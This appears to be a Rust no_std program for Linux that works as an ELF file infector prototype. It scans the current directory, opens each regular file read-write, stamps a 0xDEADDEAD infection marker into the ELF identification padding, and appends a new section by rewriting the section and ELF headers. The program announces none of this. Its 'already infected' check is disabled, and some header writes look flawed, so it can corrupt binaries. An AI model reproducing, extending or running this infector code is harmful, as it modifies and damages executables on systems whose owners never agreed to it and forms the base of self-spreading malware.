#![no_std]
#![no_main]

use core::panic::PanicInfo;
use core::mem;
use core::ptr;
use core::mem::MaybeUninit;

const SYS_EXIT: usize = 60;
const SYS_READ: usize = 0;
const SYS_WRITE: usize = 1;
const SYS_OPEN: usize = 2;
const SYS_CLOSE: usize = 3;
const SYS_PREAD64: usize = 17;
const SYS_PWRITE64: usize = 18;
const SYS_OPENAT: usize = 257;
const SYS_GETDENTS64: usize = 217;
const SYS_FSTAT: usize = 5;

const AT_FDCWD: isize = -100;
const O_RDONLY: usize = 0;
const O_RDWR: usize = 2;
const O_NONBLOCK: usize = 0x4000;
const O_DIRECTORY: usize = 0x200000;
const O_CLOEXEC: usize = 0x2000000;

const STDOUT: usize = 1;

const S_IFMT: u32 = 0o170000;
const S_IFDIR: u32 = 0o040000;

const ELF_MAGIC: [u8; 4] = [0x7f, b'E', b'L', b'F'];
const MAX_PATH_LEN: usize = 256;
const BUFFER_SIZE: usize = 1024;
const MAX_SECTIONS: usize = 128;
const MAX_STRTAB_SIZE: usize = 1024;

const SIGNATURE: u32 = 0xDEADDEAD;
const NEW_SECTION_NAME: &[u8] = b".newsec\0";
const NEW_SECTION_DATA: &[u8] = b"Hello, new section!\0";

#[repr(C)]
struct LinuxStat {
    st_dev: u64,
    st_ino: u64,
    st_nlink: u64,
    st_mode: u32,
    st_uid: u32,
    st_gid: u32,
    __pad0: u32,
    st_rdev: u64,
    st_size: i64,
    st_blksize: i64,
    st_blocks: i64,
    st_atime: i64,
    st_atime_nsec: i64,
    st_mtime: i64,
    st_mtime_nsec: i64,
    st_ctime: i64,
    st_ctime_nsec: i64,
    __unused: [i64; 3],
}

#[repr(C)]
struct LinuxDirent64 {
    d_ino: u64,
    d_off: i64,
    d_reclen: u16,
    d_type: u8,
    d_name: [u8; 256],
}

#[repr(C)]
struct ElfHeader {
    e_ident: [u8; 16],
    e_type: u16,
    e_machine: u16,
    e_version: u32,
    e_entry: u64,
    e_phoff: u64,
    e_shoff: u64,
    e_flags: u32,
    e_ehsize: u16,
    e_phentsize: u16,
    e_phnum: u16,
    e_shentsize: u16,
    e_shnum: u16,
    e_shstrndx: u16,
}

#[repr(C)]
struct Elf64_Shdr {
    sh_name: u32,
    sh_type: u32,
    sh_flags: u64,
    sh_addr: u64,
    sh_offset: u64,
    sh_size: u64,
    sh_link: u32,
    sh_info: u32,
    sh_addralign: u64,
    sh_entsize: u64,
}

#[no_mangle]
pub extern "C" fn _start() -> ! {
    let fd = open_directory(b".\0");
    check_file_status(fd);
    read_directory_entries(fd);
    unsafe { syscall(SYS_CLOSE, fd, 0, 0); }
    exit(0);
}

fn open_directory(dir: &[u8]) -> usize {
    print_str(b"Opening directory...\n");
    let fd = unsafe {
        syscall(
            SYS_OPENAT,
            AT_FDCWD as usize,
            dir.as_ptr() as usize,
            O_RDONLY|O_NONBLOCK|O_CLOEXEC
        )
    };
    if fd > isize::MAX as usize {
        print_str(b"Error opening directory: ");
        print_isize(-(fd as isize));
        print_str(b"\n");
        exit(1);
    }
    print_str(b"File opened successfully. FD: ");
    print_usize(fd);
    print_str(b"\n");
    fd
}

fn check_file_status(fd: usize) {
    let mut statbuf: MaybeUninit<LinuxStat> = 
        MaybeUninit::uninit();
    let fstat_result = unsafe {
        syscall(
            SYS_FSTAT,
            fd, 
            statbuf.as_mut_ptr() as usize, 
            0
        )
    };
    if fstat_result > isize::MAX as usize {
        print_str(b"Error checking file status. Error code: ");
        print_isize(-(fstat_result as isize));
        print_str(b"\n");
        unsafe { syscall(SYS_CLOSE, fd, 0, 0); }
        exit(1);
    }
    let st_mode = unsafe { 
        (*statbuf.as_ptr()).st_mode 
    };
    print_str(b"File mode: ");
    print_usize(st_mode as usize);
    print_str(b"\n");
}

fn read_directory_entries(fd: usize) {
    print_str(b"Reading directory entries...\n");
    let mut buffer: [MaybeUninit<u8>; BUFFER_SIZE] = 
        unsafe { MaybeUninit::uninit().assume_init() };

    let bytes_read = unsafe {
        syscall(
            SYS_GETDENTS64,
            fd, 
            buffer.as_mut_ptr() as usize, 
            BUFFER_SIZE
        )
    };
    print_str(b"Syscall return value: ");
    print_usize(bytes_read);
    print_str(b"\n");

    if bytes_read > isize::MAX as usize {
        print_str(b"Error reading directory: ");
        print_usize(!bytes_read + 1);
        print_str(b"\n");
    } else {
        print_str(b"Directory bytes read: ");
        print_usize(bytes_read);
        print_str(b"\n");

        process_directory_entries(
            fd, 
            &buffer, 
            bytes_read
        );
    }
}

fn process_directory_entries(fd: usize, 
    buffer: &[MaybeUninit<u8>; BUFFER_SIZE], 
    bytes_read: usize) {
    let buffer = unsafe { 
        &*(buffer.as_ptr() as 
                *const [u8; BUFFER_SIZE]) 
    };

    let mut offset = 0;
    while offset < bytes_read {
        let dirent = unsafe { 
            &*(buffer.as_ptr().add(offset) 
                as *const LinuxDirent64) 
        };

        if dirent.d_type == 8 {
            process_file(fd, dirent);
        }
        offset += dirent.d_reclen as usize;
    }
}

fn process_file(fd: usize, dirent: &LinuxDirent64) {
    let name_len = dirent.d_name.iter()
        .position(|&c| c == 0).unwrap_or(256);
    let file_fd = unsafe {
        syscall3(
            SYS_OPENAT, 
            fd, 
            dirent.d_name.as_ptr() as usize, 
            O_RDWR
        )
    };

    if file_fd > isize::MAX as usize {
        print_str(b"Error opening file. Error code: ");
        print_isize(-(file_fd as isize));
        print_str(b"\n");
        return;
    }

    print_str(b"File opened successfully. FD: ");
    print_usize(file_fd);
    print_str(b"\n");

    // Check the file size
    let mut statbuf: MaybeUninit<LinuxStat> 
        = MaybeUninit::uninit();

    let fstat_result = unsafe {
        syscall(
            SYS_FSTAT,
            file_fd,
            statbuf.as_mut_ptr() as usize,
            0
        )
    };

    if fstat_result != 0 {
        print_str(b"Error getting file status: ");
        print_isize(-(fstat_result as isize));
        print_str(b"\n");
        unsafe { syscall1(SYS_CLOSE, file_fd); }
        return;
    }

    let file_size = unsafe { 
        (*statbuf.as_ptr()).st_size 
    };

    print_str(b"File size: ");
    print_isize(file_size as isize);
    print_str(b" bytes\n");

    // No ELF should be less than 120 bytes
    if file_size < 120 {
        print_str(b"File too small to be an ELF\n");
        unsafe { syscall1(SYS_CLOSE, file_fd); }
        return;
    }
    
    let mut elf_header 
        = MaybeUninit::<ElfHeader>::uninit();

    let mut bytes_read = unsafe {
        syscall3(
            SYS_READ, 
            file_fd, 
            elf_header.as_mut_ptr() as usize,
            core::mem::size_of::<ElfHeader>()
        )
    };

    let mut header = unsafe { 
        elf_header.assume_init_ref() 
    };

    if bytes_read == core::mem::size_of::<ElfHeader>()
        && !is_elf_file(&header) 
    {
        return
    } 

    print_str(b"ELF file found: ");
    print_str(&dirent.d_name[..name_len]);
    print_str(b"\n");

    if is_file_processed(&header.e_ident[8..12]) {
        print_str(b"File already processed\n");
        return
    }

    let signature_bytes = SIGNATURE.to_le_bytes();

    // Write the signature as a single 4-byte write
    let bytes_written = unsafe {
        syscall4(
            SYS_PWRITE64,
            file_fd,
            signature_bytes.as_ptr() as usize,
            4,
            8 // Offset: start writing at byte 8 of e_ident
        )
    };

    if bytes_written == 4 {
        print_str(b"ELF header modified with signature\n");
    } else {
        print_str(b"Failed to write signature. Bytes written: ");
        print_isize(bytes_written as isize);
    }

    add_section(file_fd, header);

    unsafe { syscall1(SYS_CLOSE, file_fd); }
}

fn get_file_size(fd: usize) -> usize
{
    let mut statbuf 
        = MaybeUninit::<LinuxStat>::uninit();
    let result = unsafe { 
        syscall(
            SYS_FSTAT, 
            fd, 
            statbuf.as_mut_ptr() as usize, 
            0
        ) 
    };

    result
}

fn is_elf_file(header: &ElfHeader) -> bool {
    header.e_ident[0..4] == ELF_MAGIC
}

fn is_file_processed(padding: &[u8]) -> bool {
    return false
    // let signature_bytes = SIGNATURE.to_le_bytes();
    // padding == signature_bytes
}

fn add_section(file_fd: usize, elf_header: &ElfHeader) -> bool {
    let shoff = elf_header.e_shoff;
    let shentsize = elf_header.e_shentsize as usize;
    let shnum = elf_header.e_shnum as usize;

    if shnum > MAX_SECTIONS {
        return false;
    }

    // 1. Read the section header table
    let mut section_headers: [MaybeUninit<Elf64_Shdr>; MAX_SECTIONS] = unsafe { MaybeUninit::uninit().assume_init() };
    
    for i in 0..shnum {
        let bytes_read = unsafe {
            syscall4(
                SYS_PREAD64,
                file_fd,
                section_headers[i].as_mut_ptr() as usize,
                shentsize,
                (shoff + (i * shentsize) as u64) as usize
            )
        };
        if bytes_read != shentsize as isize {
            return false;
        }
    }

    // 2. Create a new section header
    let mut new_section = Elf64_Shdr {
        sh_name: 0, // We'll update this later
        sh_type: 1, // SHT_PROGBITS
        sh_flags: 0,
        sh_addr: 0,
        sh_offset: 0, // We'll update this later
        sh_size: NEW_SECTION_DATA.len() as u64,
        sh_link: 0,
        sh_info: 0,
        sh_addralign: 1,
        sh_entsize: 0,
    };

    // 3. Find space for the new section data (at the end of the file)
    let mut statbuf = MaybeUninit::<LinuxStat>::uninit();
    if unsafe { syscall(SYS_FSTAT, file_fd, statbuf.as_mut_ptr() as usize, 0) } != 0 {
        return false;
    }
    let file_size = unsafe { statbuf.assume_init().st_size as u64 };
    new_section.sh_offset = file_size;

    // 4. Update the ELF header
    let mut new_elf_header = ElfHeader {
        e_ident: elf_header.e_ident,
        e_type: elf_header.e_type,
        e_machine: elf_header.e_machine,
        e_version: elf_header.e_version,
        e_entry: elf_header.e_entry,
        e_phoff: elf_header.e_phoff,
        e_shoff: elf_header.e_shoff,
        e_flags: elf_header.e_flags,
        e_ehsize: elf_header.e_ehsize,
        e_phentsize: elf_header.e_phentsize,
        e_phnum: elf_header.e_phnum,
        e_shentsize: elf_header.e_shentsize,
        e_shnum: elf_header.e_shnum + 1,
        e_shstrndx: elf_header.e_shstrndx,
    };
    
    // 5. Write the new section data
    let bytes_written = unsafe {
        syscall4(
            SYS_PWRITE64,
            file_fd,
            NEW_SECTION_DATA.as_ptr() as usize,
            NEW_SECTION_DATA.len(),
            file_size as usize
        )
    };
    if bytes_written != NEW_SECTION_DATA.len() as isize {
        return false;
    }

    // 6. Update the section name string table
    let shstrtab = unsafe { section_headers[elf_header.e_shstrndx as usize].assume_init_ref() };
    let mut strtab: [MaybeUninit<u8>; MAX_STRTAB_SIZE] = unsafe { MaybeUninit::uninit().assume_init() };
    let bytes_read = unsafe {
        syscall4(
            SYS_PREAD64,
            file_fd,
            strtab.as_mut_ptr() as usize,
            core::cmp::min(shstrtab.sh_size as usize, MAX_STRTAB_SIZE),
            shstrtab.sh_offset as usize
        )
    };
    if bytes_read != core::cmp::min(shstrtab.sh_size as isize, MAX_STRTAB_SIZE as isize) {
        return false;
    }
    
    let new_name_offset = shstrtab.sh_size;
    if (new_name_offset as usize + NEW_SECTION_NAME.len()) > MAX_STRTAB_SIZE {
        return false;
    }
    for (i, &byte) in NEW_SECTION_NAME.iter().enumerate() {
        unsafe { *strtab[new_name_offset as usize + i].as_mut_ptr() = byte; }
    }
    new_section.sh_name = new_name_offset as u32;

    // Write updated string table
    let bytes_written = unsafe {
        syscall4(
            SYS_PWRITE64,
            file_fd,
            strtab.as_ptr() as usize,
            new_name_offset as usize + NEW_SECTION_NAME.len(),
            shstrtab.sh_offset as usize
        )
    };
    if bytes_written != (new_name_offset as usize + NEW_SECTION_NAME.len()) as isize {
        return false;
    }

    // 7. Write the new section header
    let bytes_written = unsafe {
        syscall4(
            SYS_PWRITE64,
            file_fd,
            &new_section as *const Elf64_Shdr as usize,
            core::mem::size_of::<Elf64_Shdr>(),
            (shoff + (shnum * shentsize) as u64) as usize
        )
    };
    if bytes_written != core::mem::size_of::<Elf64_Shdr>() as isize {
        return false;
    }

    // 8. Write the updated ELF header
    let bytes_written = unsafe {
        syscall4(
            SYS_PWRITE64,
            file_fd,
            &new_elf_header as *const ElfHeader as usize,
            core::mem::size_of::<ElfHeader>(),
            0
        )
    };
    if bytes_written != core::mem::size_of::<ElfHeader>() as isize {
        return false;
    }

    true
}

#[inline(always)]
unsafe fn syscall(
    id: usize, 
    arg1: usize,
    arg2: usize,
    arg3: usize
) -> usize {
    let ret: usize;
    core::arch::asm!(
        "syscall",
        in("rax") id,
        in("rdi") arg1,
        in("rsi") arg2,
        in("rdx") arg3,
        lateout("rax") ret,
    );
    ret
}

unsafe fn syscall1(n: usize, a1: usize) -> usize {
    let ret: usize;
    core::arch::asm!(
        "syscall",
        in("rax") n,
        in("rdi") a1,
        out("rcx") _,
        out("r11") _,
        lateout("rax") ret,
    );
    ret
}

unsafe fn syscall3(
    n: usize,
    a1: usize, 
    a2: usize,
    a3: usize
) -> usize {
    let ret: usize;
    core::arch::asm!(
        "syscall",
        in("rax") n,
        in("rdi") a1,
        in("rsi") a2,
        in("rdx") a3,
        out("rcx") _,
        out("r11") _,
        lateout("rax") ret,
    );
    ret
}

unsafe fn syscall4(num: usize, arg1: usize, arg2: usize, arg3: usize, arg4: usize) -> isize {
    let ret: isize;
    core::arch::asm!(
        "syscall",
        in("rax") num,
        in("rdi") arg1,
        in("rsi") arg2,
        in("rdx") arg3,
        in("r10") arg4,
        out("rcx") _, // clobbered by syscall
        out("r11") _, // clobbered by syscall
        lateout("rax") ret,
    );
    ret
}

#[inline(always)]
fn exit(code: usize) -> ! {
    unsafe {
        syscall(SYS_EXIT, code, 0, 0);
    }
    loop {}
}

fn print_isize(mut n: isize) {
    if n == 0 {
        print_char(b'0');
        return;
    }
    if n < 0 {
        print_char(b'-');
        if n == isize::MIN {
            print_str(b"9223372036854775808");
            return;
        }
        n = -n;
    }
    print_usize(n as usize);
}

fn print_usize(mut n: usize) {
    if n == 0 {
        return;
    }
    let digits = b"0123456789";
    let mut digit_count = 0;
    let mut temp = n;
    while temp > 0 {
        digit_count += 1;
        temp /= 10;
    }
    while digit_count > 0 {
        digit_count -= 1;
        let digit = (
            n / 10_usize.pow(digit_count as u32)
        ) % 10;
        print_char(digits[digit]);
    }
}

fn print_char(c: u8) {
    unsafe {
        syscall(
            SYS_WRITE, 
            STDOUT, 
            &c as *const u8 as usize, 
            1
        );
    }
}

fn print_str(s: &[u8]) {
    unsafe {
        syscall(
            SYS_WRITE,
            STDOUT, 
            s.as_ptr() as usize,
            s.len()
        );
    }
}

#[panic_handler]
fn panic(_info: &PanicInfo) -> ! {
    loop {}
}
